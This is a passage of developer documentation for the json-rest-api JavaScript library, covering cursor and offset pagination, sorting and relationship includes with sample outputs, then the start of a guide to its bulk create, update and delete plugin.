console.log('Next multiField page:', inspect(nextMultiFieldPage));
```

**Expected output**:

```text
First multiField page: {
  data: [
    {
      id: '4',
      title: 'Post 4: Even Number Post',
      content: "This is the content of post number 4. It's a even numbered post.",
      view_count: 19,
      published_at: 2025-07-07T04:16:32.004Z,
      created_at: 2025-07-28T04:16:32.005Z,
      comments_ids: [
        '30', '31', '32',
        '33', '34', '35',
        '36', '37', '38',
        '39'
      ],
      tags_ids: [ '1', '2', '3' ]
    },
    {
      id: '13',
      title: 'Post 13: Odd Number Post',
      content: "This is the content of post number 13. It's a odd numbered post.",
      view_count: 25,
      published_at: 2025-07-16T04:16:32.041Z,
      created_at: 2025-07-28T04:16:32.042Z,
      comments_ids: [],
      tags_ids: [ '1', '2', '3', '4', '5' ]
    },
    {
      id: '19',
      title: 'Post 19: Odd Number Post',
      content: "This is the content of post number 19. It's a odd numbered post.",
      view_count: 28,
      published_at: 2025-07-22T04:16:32.066Z,
      created_at: 2025-07-28T04:16:32.066Z,
      comments_ids: [],
      tags_ids: [ '1', '2', '3', '4', '5' ]
    },
    {
      id: '7',
      title: 'Post 7: Odd Number Post',
      content: "This is the content of post number 7. It's a odd numbered post.",
      view_count: 41,
      published_at: 2025-07-10T04:16:32.018Z,
      created_at: 2025-07-28T04:16:32.019Z,
      comments_ids: [],
      tags_ids: [ '1', '2', '3', '4' ]
    },
    {
      id: '20',
      title: 'Post 20: Even Number Post',
      content: "This is the content of post number 20. It's a even numbered post.",
      view_count: 74,
      published_at: 2025-07-23T04:16:32.069Z,
      created_at: 2025-07-28T04:16:32.069Z,
      comments_ids: [],
      tags_ids: [ '1', '2', '3' ]
    }
  ],
  meta: {
    pagination: {
      pageSize: 5,
      hasMore: true,
      cursor: { next: 'view_count:74,created_at:1753676192069' }
    }
  },
  links: {
    self: '/api/posts?sort=view_count&sort=-created_at&&&page[size]=5',
    first: '/api/posts?sort=view_count&sort=-created_at&&&page[size]=5',
    next: '/api/posts?sort=view_count&sort=-created_at&&&page[size]=5&page[after]=view_count:74,created_at:1753676192069'
  }
}
Next multiField page: {
  data: [
    {
      id: '6',
      title: 'Post 6: Even Number Post',
      content: "This is the content of post number 6. It's a even numbered post.",
      view_count: 148,
      published_at: 2025-07-09T04:16:32.011Z,
      created_at: 2025-07-28T04:16:32.012Z,
      comments_ids: [],
      tags_ids: [ '1', '2', '3', '4', '5' ]
    },
    {
      id: '22',
      title: 'Post 22: Even Number Post',
      content: "This is the content of post number 22. It's a even numbered post.",
      view_count: 161,
      published_at: 2025-07-25T04:16:32.073Z,
      created_at: 2025-07-28T04:16:32.074Z,
      comments_ids: [],
      tags_ids: [ '1', '2', '3', '4', '5' ]
    },
    {
      id: '5',
      title: 'Post 5: Odd Number Post',
      content: "This is the content of post number 5. It's a odd numbered post.",
      view_count: 235,
      published_at: 2025-07-08T04:16:32.007Z,
      created_at: 2025-07-28T04:16:32.008Z,
      comments_ids: [
        '40', '41', '42',
        '43', '44', '45',
        '46', '47', '48',
        '49', '50', '51'
      ],
      tags_ids: [ '1', '2', '3', '4', '5' ]
    },
    {
      id: '9',
      title: 'Post 9: Odd Number Post',
      content: "This is the content of post number 9. It's a odd numbered post.",
      view_count: 249,
      published_at: 2025-07-12T04:16:32.024Z,
      created_at: 2025-07-28T04:16:32.026Z,
      comments_ids: [],
      tags_ids: [ '1', '2', '3', '4', '5' ]
    },
    {
      id: '17',
      title: 'Post 17: Odd Number Post',
      content: "This is the content of post number 17. It's a odd numbered post.",
      view_count: 290,
      published_at: 2025-07-20T04:16:32.055Z,
      created_at: 2025-07-28T04:16:32.056Z,
      comments_ids: [],
      tags_ids: [ '1', '2', '3', '4', '5' ]
    }
  ],
  meta: {
    pagination: {
      pageSize: 5,
      hasMore: true,
      cursor: { next: 'view_count:290,created_at:1753676192056' }
    }
  },
  links: {
    self: '/api/posts?sort=view_count&sort=-created_at&&&page[size]=5&page[after]=view_count:74,created_at:1753676192069',
    first: '/api/posts?sort=view_count&sort=-created_at&&&page[size]=5',
    next: '/api/posts?sort=view_count&sort=-created_at&&&page[size]=5&page[after]=view_count:290,created_at:1753676192056'
  }
}
```


**Cursor Pagination Notes:**
- Cursors are simple strings containing the sort field values (format: `field:value,field2:value2`)
- The API automatically generates appropriate WHERE clauses based on sort direction
- Cursor pagination is more efficient for large datasets as it doesn't need to count all records
- Works seamlessly with any sort field, not just timestamps
- **Multi-field sorting is fully supported** - When sorting by multiple fields (e.g., `sort: ['category', 'name']`), the cursor includes all sort fields and correctly handles records with duplicate values in the first sort field

**Pagination with Sorting**

You can combine pagination with sorting. The sort order is maintained across pages:

```javascript
// Get posts sorted by view count (highest first)
const popularPosts = await api.resources.posts.query({
  queryParams: {
    sort: ['-view_count'],  // Minus prefix means descending
    page: { number: 1, size: 5 }
  }
});
// HTTP: GET /api/posts?sort=-view_count&page[number]=1&page[size]=5
// Returns: {
//   data: [
//     { id: '5', title: 'Post 5', view_count: 950, ... },
//     { id: '15', title: 'Post 15', view_count: 850, ... },
//     { id: '20', title: 'Post 20', view_count: 750, ... },
//     { id: '10', title: 'Post 10', view_count: 650, ... },
//     { id: '25', title: 'Post 25', view_count: 550, ... }
//   ],
//   meta: { pagination: { page: 1, pageSize: 5, pageCount: 5, total: 25 } }
// }

// Get posts sorted by multiple fields
const multiSort = await api.resources.posts.query({
  queryParams: {
    sort: ['published_at', '-view_count'],  // Oldest first, then by views
    page: { number: 1, size: 5 }
  }
});
// HTTP: GET /api/posts?sort=published_at,-view_count&page[number]=1&page[size]=5
// Returns: {
//   data: [
//     { id: '1', title: 'Post 1', published_at: '2024-01-01T00:00:00Z', view_count: 100, ... },
//     { id: '2', title: 'Post 2', published_at: '2024-01-02T00:00:00Z', view_count: 200, ... },
//     // ... posts sorted first by date, then by views within same date
//   ],
//   meta: { pagination: { page: 1, pageSize: 5, pageCount: 5, total: 25 } }
// }

console.log('Popular sort:', inspect(popularPosts));
console.log('Multisort:', inspect(multiSort));
```

**Expected output**:

```text
Popular sort: {
  data: [
    {
      id: '6',
      title: 'Post 6: Even Number Post',
      content: "This is the content of post number 6. It's a even numbered post.",
      view_count: 910,
      published_at: 2025-07-09T04:21:13.403Z,
      created_at: 2025-07-28T04:21:13.404Z,
      comments_ids: [],
      tags_ids: [ '1', '2', '3' ]
    },
    {
      id: '24',
      title: 'Post 24: Even Number Post',
      content: "This is the content of post number 24. It's a even numbered post.",
      view_count: 871,
      published_at: 2025-07-27T04:21:13.454Z,
      created_at: 2025-07-28T04:21:13.454Z,
      comments_ids: [],
      tags_ids: [ '1', '2', '3', '4' ]
    },
    {
      id: '18',
      title: 'Post 18: Even Number Post',
      content: "This is the content of post number 18. It's a even numbered post.",
      view_count: 870,
      published_at: 2025-07-21T04:21:13.437Z,
      created_at: 2025-07-28T04:21:13.438Z,
      comments_ids: [],
      tags_ids: [ '1', '2', '3', '4', '5' ]
    },
    {
      id: '8',
      title: 'Post 8: Even Number Post',
      content: "This is the content of post number 8. It's a even numbered post.",
      view_count: 848,
      published_at: 2025-07-11T04:21:13.410Z,
      created_at: 2025-07-28T04:21:13.410Z,
      comments_ids: [],
      tags_ids: [ '1', '2', '3' ]
    },
    {
      id: '22',
      title: 'Post 22: Even Number Post',
      content: "This is the content of post number 22. It's a even numbered post.",
      view_count: 838,
      published_at: 2025-07-25T04:21:13.449Z,
      created_at: 2025-07-28T04:21:13.450Z,
      comments_ids: [],
      tags_ids: [ '1', '2', '3', '4' ]
    }
  ],
  meta: {
    pagination: { page: 1, pageSize: 5, pageCount: 5, total: 25, hasMore: true }
  },
  links: {
    self: '/api/posts?sort=-view_count&&&page[number]=1&page[size]=5',
    first: '/api/posts?sort=-view_count&&&page[number]=1&page[size]=5',
    last: '/api/posts?sort=-view_count&&&page[number]=5&page[size]=5',
    next: '/api/posts?sort=-view_count&&&page[number]=2&page[size]=5'
  }
}
Multisort: {
  data: [
    {
      id: '1',
      title: 'Post 1: Odd Number Post',
      content: "This is the content of post number 1. It's a odd numbered post.",
      view_count: 468,
      published_at: 2025-07-04T04:21:13.385Z,
      created_at: 2025-07-28T04:21:13.386Z,
      comments_ids: [
        '1', '2',  '3',  '4',
        '5', '6',  '7',  '8',
        '9', '10', '11', '12'
      ],
      tags_ids: [ '1', '2', '3' ]
    },
    {
      id: '2',
      title: 'Post 2: Even Number Post',
      content: "This is the content of post number 2. It's a even numbered post.",
      view_count: 652,
      published_at: 2025-07-05T04:21:13.389Z,
      created_at: 2025-07-28T04:21:13.390Z,
      comments_ids: [
        '13', '14', '15',
        '16', '17', '18',
        '19', '20', '21',
        '22', '23', '24'
      ],
      tags_ids: [ '1', '2', '3', '4' ]
    },
    {
      id: '3',
      title: 'Post 3: Odd Number Post',
      content: "This is the content of post number 3. It's a odd numbered post.",
      view_count: 198,
      published_at: 2025-07-06T04:21:13.393Z,
      created_at: 2025-07-28T04:21:13.394Z,
      comments_ids: [
        '25', '26', '27',
        '28', '29', '30',
        '31', '32', '33',
        '34', '35', '36'
      ],
      tags_ids: [ '1', '2', '3', '4', '5' ]
    },
    {
      id: '4',
      title: 'Post 4: Even Number Post',
      content: "This is the content of post number 4. It's a even numbered post.",
      view_count: 606,
      published_at: 2025-07-07T04:21:13.396Z,
      created_at: 2025-07-28T04:21:13.397Z,
      comments_ids: [
        '37', '38', '39',
        '40', '41', '42',
        '43', '44', '45',
        '46'
      ],
      tags_ids: [ '1', '2', '3', '4', '5' ]
    },
    {
      id: '5',
      title: 'Post 5: Odd Number Post',
      content: "This is the content of post number 5. It's a odd numbered post.",
      view_count: 142,
      published_at: 2025-07-08T04:21:13.400Z,
      created_at: 2025-07-28T04:21:13.401Z,
      comments_ids: [
        '47', '48', '49',
        '50', '51', '52',
        '53', '54', '55',
        '56'
      ],
      tags_ids: [ '1', '2', '3', '4', '5' ]
    }
  ],
  meta: {
    pagination: { page: 1, pageSize: 5, pageCount: 5, total: 25, hasMore: true }
  },
  links: {
    self: '/api/posts?sort=published_at&sort=-view_count&&&page[number]=1&page[size]=5',
    first: '/api/posts?sort=published_at&sort=-view_count&&&page[number]=1&page[size]=5',
    last: '/api/posts?sort=published_at&sort=-view_count&&&page[number]=5&page[size]=5',
    next: '/api/posts?sort=published_at&sort=-view_count&&&page[number]=2&page[size]=5'
  }
}
```

**Limits and Ordering for Included Relationships**

When you include relationships in your query, they use the default `limit` and `orderBy` values defined in the relationship schema. These defaults are applied automatically and cannot be overridden in the query:

```javascript
// The relationship was defined with default limits:
// relationships: {
//   comments: { 
//     hasMany: 'comments',
//     include: {
//       limit: 5,              // Always return max 5 comments
//       orderBy: ['-created_at'] // Always order by newest first
//     }
//   }
// }

// When you include comments, these defaults are automatically applied:
const postsWithComments = await api.resources.posts.query({
  queryParams: {
    include: ['comments'],     // Just specify which relationships to include
    page: { number: 1, size: 3 }  // This controls posts pagination only
  }
});
// HTTP: GET /api/posts?include=comments&page[number]=1&page[size]=3
// Returns: {
//   data: [
//     { id: '1', title: 'Post 1', ..., 
//       comments: [ /* Up to 5 comments, ordered by newest first */ ]
//     },
//     { id: '2', title: 'Post 2', ..., 
//       comments: [ /* Up to 5 comments, newest first */ ]
//     },
//     { id: '3', title: 'Post 3', ..., 
//       comments: [ /* Up to 5 comments, newest first */ ]
//     }
//   ],
//   meta: { pagination: { page: 1, pageSize: 3, pageCount: 9, total: 25 } }
// }

// Display the results
console.log('Posts with comments:', inspect(postsWithComments));

// Get posts with both comments and tags, using their configured limits
const postsWithAll = await api.resources.posts.query({
  queryParams: {
    include: ['comments', 'tags'],
    page: { number: 1, size: 2 }
  }
});

console.log('\nPosts with all relationships:', inspect(postsWithAll));
```

**Expected Output**

```text
Posts with comments: {
  data: [
    {
      id: '25',
      title: 'Post 25: Odd Number Post',
      content: "This is the content of post number 25. It's a odd numbered post.",
      view_count: 483,
      published_at: 2025-07-28T04:50:14.529Z,
      created_at: 2025-07-28T04:50:14.530Z,
      comments_ids: [],
      tags_ids: [ '1', '2', '3', '4' ]
    },
    {
      id: '24',
      title: 'Post 24: Even Number Post',
      content: "This is the content of post number 24. It's a even numbered post.",
      view_count: 719,
      published_at: 2025-07-27T04:50:14.526Z,
      created_at: 2025-07-28T04:50:14.527Z,
      comments_ids: [],
      tags_ids: [ '1', '2', '3', '4' ]
    },
    {
      id: '23',
      title: 'Post 23: Odd Number Post',
      content: "This is the content of post number 23. It's a odd numbered post.",
      view_count: 167,
      published_at: 2025-07-26T04:50:14.523Z,
      created_at: 2025-07-28T04:50:14.524Z,
      comments_ids: [],
      tags_ids: [ '1', '2', '3', '4', '5' ]
    }
  ],
  meta: {
    pagination: { page: 1, pageSize: 3, pageCount: 9, total: 25, hasMore: true }
  },
  links: {
    self: '/api/posts?include=comments&&sort=-created_at&page[number]=1&page[size]=3',
    first: '/api/posts?include=comments&&sort=-created_at&page[number]=1&page[size]=3',
    last: '/api/posts?include=comments&&sort=-created_at&page[number]=9&page[size]=3',
    next: '/api/posts?include=comments&&sort=-created_at&page[number]=2&page[size]=3'
  }
}

Posts with all relationships: {
  data: [
    {
      id: '25',
      title: 'Post 25: Odd Number Post',
      content: "This is the content of post number 25. It's a odd numbered post.",
      view_count: 483,
      published_at: 2025-07-28T04:50:14.529Z,
      created_at: 2025-07-28T04:50:14.530Z,
      comments_ids: [],
      tags_ids: [ '1', '2', '3', '4' ],
      tags: [
        { id: '1', name: 'tag-01', usage_count: 74, posts_ids: [] },
        { id: '2', name: 'tag-02', usage_count: 36, posts_ids: [] },
        { id: '3', name: 'tag-03', usage_count: 59, posts_ids: [] },
        { id: '4', name: 'tag-04', usage_count: 63, posts_ids: [] }
      ]
    },
    {
      id: '24',
      title: 'Post 24: Even Number Post',
      content: "This is the content of post number 24. It's a even numbered post.",
      view_count: 719,
      published_at: 2025-07-27T04:50:14.526Z,
      created_at: 2025-07-28T04:50:14.527Z,
      comments_ids: [],
      tags_ids: [ '1', '2', '3', '4' ],
      tags: [
        { id: '1', name: 'tag-01', usage_count: 74, posts_ids: [] },
        { id: '2', name: 'tag-02', usage_count: 36, posts_ids: [] },
        { id: '3', name: 'tag-03', usage_count: 59, posts_ids: [] },
        { id: '4', name: 'tag-04', usage_count: 63, posts_ids: [] }
      ]
    }
  ],
  meta: {
    pagination: { page: 1, pageSize: 2, pageCount: 13, total: 25, hasMore: true }
  },
  links: {
    self: '/api/posts?include=comments&include=tags&&sort=-created_at&page[number]=1&page[size]=2',
    first: '/api/posts?include=comments&include=tags&&sort=-created_at&page[number]=1&page[size]=2',
    last: '/api/posts?include=comments&include=tags&&sort=-created_at&page[number]=13&page[size]=2',
    next: '/api/posts?include=comments&include=tags&&sort=-created_at&page[number]=2&page[size]=2'
  }
}
```

**Pagination Links**

The API automatically generates pagination links following JSON:API specification:

```javascript
// Get a page with full pagination info
const pagedResult = await api.resources.posts.query({
  queryParams: {
    page: { number: 2, size: 5 },
    sort: ['-published_at']
  },
  simplified: false  // Use JSON:API format to see links
});
// HTTP: GET /api/posts?page[number]=2&page[size]=5&sort=-published_at
// Returns (JSON:API): {
//   data: [ /* 5 posts */ ],
//   links: {
//     first: '/api/posts?page[number]=1&page[size]=5&sort=-published_at',
//     prev: '/api/posts?page[number]=1&page[size]=5&sort=-published_at',
//     next: '/api/posts?page[number]=3&page[size]=5&sort=-published_at',
//     last: '/api/posts?page[number]=5&page[size]=5&sort=-published_at'
//   },
//   meta: {
//     pagination: {
//       page: 2,
//       pageSize: 5,
//       pageCount: 5,
//       total: 25
//     }
//   }
// }

console.log('Pagination links:', JSON.stringify(pagedResult.links, null, 2));
console.log('Pagination meta:', JSON.stringify(pagedResult.meta, null, 2));
```

**Expected Output**

```text
Pagination links: {
  "self": "/api/posts?sort=-published_at&&&page[number]=2&page[size]=5",
  "first": "/api/posts?sort=-published_at&&&page[number]=1&page[size]=5",
  "last": "/api/posts?sort=-published_at&&&page[number]=5&page[size]=5",
  "prev": "/api/posts?sort=-published_at&&&page[number]=1&page[size]=5",
  "next": "/api/posts?sort=-published_at&&&page[number]=3&page[size]=5"
}
Pagination meta: {
  "pagination": {
    "page": 2,
    "pageSize": 5,
    "pageCount": 5,
    "total": 25,
    "hasMore": true
  }
}
```

**Combining Everything: Filters, Sorting, Pagination, and Includes**

```javascript
// Complex query combining all features
const complexQuery = await api.resources.posts.query({
  queryParams: {
    filters: {
      title: 'Even'  // Only posts with "Even" in title
    },
    sort: ['-view_count', 'published_at'],  // Most viewed first, then oldest
    page: { number: 1, size: 3 },
    include: ['comments', 'tags']
  }
});
// HTTP: GET /api/posts?filter[title]=Even&sort=-view_count,published_at&page[number]=1&page[size]=3&include=comments,tags
// Returns: {
//   data: [
//     { id: '20', title: 'Even Post 20', view_count: 750, 
//       comments: [ /* Up to 5 newest */ ],
//       tags: [ /* Up to 10, alphabetical */ ]
//     },
//     { id: '10', title: 'Even Post 10', view_count: 650,
//       comments: [ /* Up to 5 newest */ ],
//       tags: [ /* Up to 10, alphabetical */ ]
//     },
//     { id: '2', title: 'Even Post 2', view_count: 200,
//       comments: [ /* Up to 5 newest */ ],
//       tags: [ /* Up to 10, alphabetical */ ]
//     }
//   ],
//   meta: { 
//     pagination: { 
//       page: 1, 
//       pageSize: 3, 
//       pageCount: 4,  // 12 "Even" posts total
//       total: 12 
//     } 
//   }
// });

console.log('\nComplex query results:', inspect(complexQuery));
```

**Expected results:**

```text
Complex query results: {
  data: [
    {
      id: '14',
      title: 'Post 14: Even Number Post',
      content: "This is the content of post number 14. It's a even numbered post.",
      view_count: 968,
      published_at: 2025-07-17T05:03:41.480Z,
      created_at: 2025-07-28T05:03:41.480Z,
      comments_ids: [],
      tags_ids: [ '1', '2', '3' ],
      tags: [
        { id: '1', name: 'tag-01', usage_count: 43, posts_ids: [] },
        { id: '2', name: 'tag-02', usage_count: 80, posts_ids: [] },
        { id: '3', name: 'tag-03', usage_count: 6, posts_ids: [] }
      ]
    },
    {
      id: '2',
      title: 'Post 2: Even Number Post',
      content: "This is the content of post number 2. It's a even numbered post.",
      view_count: 844,
      published_at: 2025-07-05T05:03:41.439Z,
      created_at: 2025-07-28T05:03:41.440Z,
      comments_ids: [ '19', '18', '17', '16', '15' ],
      comments: [
        {
          id: '19',
          content: 'Comment 10 on post 2',
          author_name: 'User 3',
          created_at: 2025-07-28T05:03:41.542Z,
          likes: 27
        },
        {
          id: '18',
          content: 'Comment 9 on post 2',
          author_name: 'User 2',
          created_at: 2025-07-28T04:03:41.541Z,
          likes: 27
        },
        {
          id: '17',
          content: 'Comment 8 on post 2',
          author_name: 'User 7',
          created_at: 2025-07-28T03:03:41.539Z,
          likes: 31
        },
        {
          id: '16',
          content: 'Comment 7 on post 2',
          author_name: 'User 10',
          created_at: 2025-07-28T02:03:41.538Z,
          likes: 27
        },
        {
          id: '15',
          content: 'Comment 6 on post 2',
          author_name: 'User 9',
          created_at: 2025-07-28T01:03:41.535Z,
          likes: 46
        }
      ],
      tags_ids: [ '1', '2', '3', '4' ],
      tags: [
        { id: '1', name: 'tag-01', usage_count: 43, posts_ids: [] },
        { id: '2', name: 'tag-02', usage_count: 80, posts_ids: [] },
        { id: '3', name: 'tag-03', usage_count: 6, posts_ids: [] },
        { id: '4', name: 'tag-04', usage_count: 92, posts_ids: [] }
      ]
    },
    {
      id: '18',
      title: 'Post 18: Even Number Post',
      content: "This is the content of post number 18. It's a even numbered post.",
      view_count: 623,
      published_at: 2025-07-21T05:03:41.492Z,
      created_at: 2025-07-28T05:03:41.492Z,
      comments_ids: [],
      tags_ids: [ '1', '2', '3', '4' ],
      tags: [
        { id: '1', name: 'tag-01', usage_count: 43, posts_ids: [] },
        { id: '2', name: 'tag-02', usage_count: 80, posts_ids: [] },
        { id: '3', name: 'tag-03', usage_count: 6, posts_ids: [] },
        { id: '4', name: 'tag-04', usage_count: 92, posts_ids: [] }
      ]
    }
  ],
  meta: {
    pagination: { page: 1, pageSize: 3, pageCount: 4, total: 12, hasMore: true }
  },
  links: {
    self: '/api/posts?filters[title]=Even&sort=-view_count&sort=published_at&include=comments&include=tags&&page[number]=1&page[size]=3',
    first: '/api/posts?filters[title]=Even&sort=-view_count&sort=published_at&include=comments&include=tags&&page[number]=1&page[size]=3',
    last: '/api/posts?filters[title]=Even&sort=-view_count&sort=published_at&include=comments&include=tags&&page[number]=4&page[size]=3',
    next: '/api/posts?filters[title]=Even&sort=-view_count&sort=published_at&include=comments&include=tags&&page[number]=2&page[size]=3'
  }
}
```

The pagination and ordering system is designed to be efficient and predictable:
- Parent records are paginated and sorted according to the main query
- Child records are independently paginated and sorted according to their relationship configuration
- All limits respect the configured maximums to prevent performance issues
- The system automatically uses SQL window functions for efficient pagination of included records when supported by the database

---

[Previous: 2.6 Many to many (hasMany with through records)](./GUIDE_2_6_Many_To_Many.md) | [Back to Guide](./README.md)# Bulk Operations Guide

The **Bulk Operations Plugin** enables efficient processing of multiple records in a single request, supporting atomic transactions, batch processing, and error handling. This guide demonstrates how to create, update, and delete multiple records efficiently.

## Overview

Bulk operations are essential for:
- **Data Import/Export**: Processing large datasets efficiently
- **Batch Updates**: Modifying multiple records with consistent rules
- **Transactional Safety**: Ensuring all-or-nothing operations
- **Performance**: Reducing network overhead and database round-trips

The plugin provides three main operations:
- **bulkPost**: Create multiple records
- **bulkPatch**: Update multiple records
- **bulkDelete**: Delete multiple records

## Installation and Setup

First, install the Bulk Operations plugin alongside the standard REST API plugins:

```javascript
import { RestApiPlugin, RestApiKnexPlugin } from 'json-rest-api';
import { BulkOperationsPlugin } from 'json-rest-api/plugins/core/bulk-operations-plugin.js';
import { Api } from 'hooked-api';
import knexLib from 'knex';
import util from 'util';

// Utility for displaying results
const inspect = (obj) => util.inspect(obj, { depth: 5 });

// Create database connection
const knex = knexLib({
  client: 'sqlite3',
  connection: { filename: ':memory:' },
  useNullAsDefault: true
});

// Create API instance
const api = new Api({
  name: 'book-catalog-api'
});

// Install plugins in order
await api.use(RestApiPlugin);
await api.use(RestApiKnexPlugin, { knex });

// Install Bulk Operations plugin with configuration
await api.use(BulkOperationsPlugin, {
  'bulk-operations': {
    maxBulkOperations: 100,     // Maximum records per request
    defaultAtomic: true,        // Default transaction mode
    batchSize: 10,             // Internal batch processing size
    enableOptimizations: true   // Enable database-specific optimizations
  }
});
```

## Configuration Options

The Bulk Operations plugin supports several configuration options:

| Option | Type | Default | Description |
|--------|------|---------|-------------|
| `maxBulkOperations` | number | 100 | Maximum number of records that can be processed in a single request |
| `defaultAtomic` | boolean | true | Whether operations are atomic (all-or-nothing) by default |
| `batchSize` | number | 100 | Number of records to process in each internal batch |
| `enableOptimizations` | boolean | true | Enable database-specific bulk optimizations when available |

## Using the Book Catalog Schema

Let's use the standard book catalog schema for all examples:

```javascript
// Define the book catalog schema
await api.addResource('countries', {
  schema: {
    id: { type: 'id' },
    name: { type: 'string', required: true, max: 100 },
    code: { type: 'string', max: 2, unique: true }
  },
  relationships: {
    publishers: { hasMany: 'publishers', foreignKey: 'country_id' },
    books: { hasMany: 'books', foreignKey: 'country_id' }
  }
});

await api.addResource('publishers', {
  schema: {
    id: { type: 'id' },
    name: { type: 'string', required: true, max: 200 },
    country_id: { type: 'number', nullable: true, belongsTo: 'countries', as: 'country' }
  },
  relationships: {
    books: { hasMany: 'books', foreignKey: 'publisher_id' }
  }
});

await api.addResource('authors', {
  schema: {
    id: { type: 'id' },
    name: { type: 'string', required: true, max: 200 }
  },
  relationships: {
    books: { hasMany: 'books', through: 'book_authors', foreignKey: 'author_id', otherKey: 'book_id' }
  }
});

await api.addResource('books', {
  schema: {
    id: { type: 'id' },
    title: { type: 'string', required: true, max: 300 },
    country_id: { type: 'number', required: true, belongsTo: 'countries', as: 'country' },
    publisher_id: { type: 'number', nullable: true, belongsTo: 'publishers', as: 'publisher' }
  },
  relationships: {
    authors: { hasMany: 'authors', through: 'book_authors', foreignKey: 'book_id', otherKey: 'author_id' }
  }
});

await api.addResource('book_authors', {
  schema: {
    id: { type: 'id' },
    book_id: { type: 'number', required: true, belongsTo: 'books', as: 'book' },
    author_id: { type: 'number', required: true, belongsTo: 'authors', as: 'author' }
  }
});

// Create tables
await api.resources.countries.createKnexTable();
await api.resources.publishers.createKnexTable();
await api.resources.authors.createKnexTable();
await api.resources.books.createKnexTable();
await api.resources.book_authors.createKnexTable();
```

## Bulk Create (bulkPost)

Create multiple records in a single operation. The `bulkPost` method accepts an array of JSON:API documents.

### Basic Bulk Create

```javascript
// Create multiple authors at once
const bulkCreateResult = await api.scopes.authors.bulkPost({
  inputRecords: [
    { type: 'authors', attributes: { name: 'J.K. Rowling' } },
    { type: 'authors', attributes: { name: 'George R.R. Martin' } },
    { type: 'authors', attributes: { name: 'Brandon Sanderson' } }
  ],
  atomic: true  // All succeed or all fail
});

console.log(inspect(bulkCreateResult));
// Output:
// {
//   data: [
//     { type: 'authors', id: '1', attributes: { name: 'J.K. Rowling' } },
//     { type: 'authors', id: '2', attributes: { name: 'George R.R. Martin' } },
//     { type: 'authors', id: '3', attributes: { name: 'Brandon Sanderson' } }
//   ],
//   meta: {
//     total: 3,
//     succeeded: 3,
//     failed: 0,
//     atomic: true
//   }
// }
```

### Bulk Create with Relationships

Create records with relationships to existing data:

```javascript
// First, create some countries and publishers
await api.resources.countries.post({
  inputRecord: { type: 'countries', attributes: { name: 'United States', code: 'US' } }
});
await api.resources.countries.post({
  inputRecord: { type: 'countries', attributes: { name: 'United Kingdom', code: 'UK' } }
});

// Create publishers with country relationships
const publisherResult = await api.scopes.publishers.bulkPost({
  inputRecords: [
    { 
      type: 'publishers', 
      attributes: { name: 'Penguin Random House' },
      relationships: {
        country: { data: { type: 'countries', id: '1' } }  // US
      }
    },
    { 
      type: 'publishers', 
      attributes: { name: 'Bloomsbury Publishing' },
      relationships: {
        country: { data: { type: 'countries', id: '2' } }  // UK
      }
    }
  ]
});

console.log('Created publishers:', publisherResult.meta.succeeded);
```

### Non-Atomic Mode (Partial Success)

Allow some records to fail while others succeed:

```javascript
const partialResult = await api.scopes.authors.bulkPost({
  inputRecords: [
    { type: 'authors', attributes: { name: 'Valid Author' } },
    { type: 'authors', attributes: {} },  // Invalid - missing required name
    { type: 'authors', attributes: { name: 'Another Valid Author' } }
  ],
  atomic: false  // Allow partial success
});

console.log(inspect(partialResult));
// Output:
// {
//   data: [
//     { type: 'authors', id: '4', attributes: { name: 'Valid Author' } },
//     { type: 'authors', id: '5', attributes: { name: 'Another Valid Author' } }
//   ],
//   errors: [{
//     index: 1,
//     status: 'error',
//     error: {
//       code: 'REST_API_VALIDATION',
//       message: 'Schema validation failed for resource attributes',
//       details: { fields: ['data.attributes.name'], violations: [...] }
//     }
//   }],
//   meta: {
//     total: 3,
//     succeeded: 2,
//     failed: 1,
//     atomic: false
//   }
// }
```

## Bulk Update (bulkPatch)

Update multiple records with different values in a single operation.

### Basic Bulk Update

```javascript
// Update multiple authors
const bulkUpdateResult = await api.scopes.authors.bulkPatch({
  operations: [
    { 
      id: '1', 
      data: { 
        type: 'authors', 
        id: '1', 
        attributes: { name: 'J.K. Rowling (Harry Potter)' } 
      }
    },
    { 
      id: '2', 
      data: { 
        type: 'authors', 
        id: '2', 
        attributes: { name: 'George R.R. Martin (Game of Thrones)' } 
      }
    }
  ],
  atomic: true
});

console.log('Updated authors:', bulkUpdateResult.meta.succeeded);
```

### Updating Relationships

Bulk update relationships between resources:

```javascript
// Create some books first
const bookResults = await api.scopes.books.bulkPost({
  inputRecords: [
    { 
      type: 'books', 
      attributes: { title: 'Harry Potter and the Philosopher\'s Stone' },
      relationships: { 
        country: { data: { type: 'countries', id: '2' } }  // UK
      }
    },
    { 
      type: 'books', 
      attributes: { title: 'A Game of Thrones' },
      relationships: { 
        country: { data: { type: 'countries', id: '1' } }  // US
      }
    }
  ]
});

// Now update the books to assign publishers
const bookIds = bookResults.data.map(book => book.id);
const updateOps = await api.scopes.books.bulkPatch({
  operations: [
    {
      id: bookIds[0],
      data: {
        type: 'books',
        id: bookIds[0],
        attributes: {},
        relationships: {
          publisher: { data: { type: 'publishers', id: '2' } }  // Bloomsbury
        }
      }
    },
    {
      id: bookIds[1],
      data: {
        type: 'books',
        id: bookIds[1],
        attributes: {},
        relationships: {
          publisher: { data: { type: 'publishers', id: '1' } }  // Penguin
        }
      }
    }
  ]
});

console.log('Updated book relationships:', updateOps.meta.succeeded);
```

### Handling Update Errors

When updating non-existent records or with invalid data:

```javascript
const errorResult = await api.scopes.authors.bulkPatch({
  operations: [
    { id: '1', data: { type: 'authors', id: '1', attributes: { name: 'Updated Name' } } },
    { id: '999', data: { type: 'authors', id: '999', attributes: { name: 'Non-existent' } } },
    { id: '2', data: { type: 'authors', id: '2', attributes: { name: '' } } }  // Empty name
  ],
  atomic: false  // Allow partial success
});

console.log(inspect(errorResult));
// Shows successful updates and errors for failed operations
```

## Bulk Delete (bulkDelete)

Delete multiple records by their IDs.

### Basic Bulk Delete

```javascript
// Delete multiple authors
const bulkDeleteResult = await api.scopes.authors.bulkDelete({
  ids: ['4', '5', '6'],
  atomic: true
});

console.log(inspect(bulkDeleteResult));
// Output:
// {
//   meta: {
//     total: 3,
//     succeeded: 3,
//     failed: 0,
//     deleted: ['4', '5', '6'],
//     atomic: true
//   }
// }
```

### Handling Referential Integrity

When deleting records with relationships:

```javascript
// Try to delete a country that has books
try {
  await api.scopes.countries.bulkDelete({
    ids: ['1', '2'],  // Countries with related books
    atomic: true
  });
} catch (error) {
  console.log('Cannot delete:', error.message);
  // Will fail due to foreign key constraints
}

// First delete the related records
await api.scopes.books.bulkDelete({
  ids: bookIds,  // Delete books first
  atomic: true
});

// Now can delete the countries
await api.scopes.countries.bulkDelete({
  ids: ['1', '2'],
  atomic: true
});
```

### Mixed Success Scenarios

